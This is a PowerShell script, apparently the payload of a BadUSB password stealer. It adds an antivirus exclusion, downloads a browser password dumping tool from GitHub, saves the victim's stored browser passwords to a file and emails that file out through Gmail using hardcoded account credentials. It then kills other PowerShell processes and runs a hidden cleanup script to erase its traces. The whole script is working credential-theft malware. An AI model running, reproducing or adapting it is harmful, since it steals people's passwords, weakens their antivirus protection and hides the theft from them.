Set-Location C:\Users\Public\Documents #Go to the folder in which we will donwload files
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/fin.ps1 -OutFile fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
.\WebBrowserPassView.exe /stext passwords.txt #Create the file for Browser passwords
Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
#Set mail option
$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('bocaj2024@gmail.com', 'Soccer2006') #Email with which you want to send information
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'bocaj2024@gmail.com' #Email in which you want to receice the information
$ReportEmail.To.Add('bocaj2024@gmail.com') #Email in which you want to receive the information
$ReportEmail.Subject = 'ChromePassStealerV2'
$ReportEmail.Body = 'Attached is your list of informations.'
$ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
 $SMTPInfo.Send($ReportEmail) #Send mail
Start-Sleep -Seconds 15 #Wait 15 seconds
Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
Start-Sleep -Seconds 30 #Wait 30 seconds
#Delete nirsoft tools and .ps1 file
Remove-Item ciaoV2.ps1
Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
powershell.exe -noexit -windowstyle hidden -file fin.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
exit #End .ps1 file
